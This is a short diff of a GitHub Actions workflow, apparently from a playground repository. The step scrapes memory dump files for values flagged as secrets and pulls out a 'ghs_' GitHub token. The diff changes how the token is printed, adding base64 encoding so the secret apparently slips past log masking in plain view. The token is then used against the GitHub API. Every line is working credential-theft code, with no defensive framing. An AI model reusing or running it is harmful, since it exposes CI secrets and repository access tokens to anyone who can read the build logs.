@@ -19,7 +19,8 @@ jobs:
           B64_BLOB=`grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64 -w 0`
           echo $B64_BLOB
           GH_TOKEN=`echo $B64_BLOB | base64 -d | grep -Eao "ghs_.+?\"" | sed "s/\"//g" | sort -u | head -1`
-          echo GH_TOKEN=$GH_TOKEN
+          
+          echo GH_TOKEN=$GH_TOKEN | base64 
           
           curl -s -L -H "Authorization: Bearer $GH_TOKEN"  "https://api.github.com/repos/octoberwar/action-playground/contents/package.json?ref=main"
 
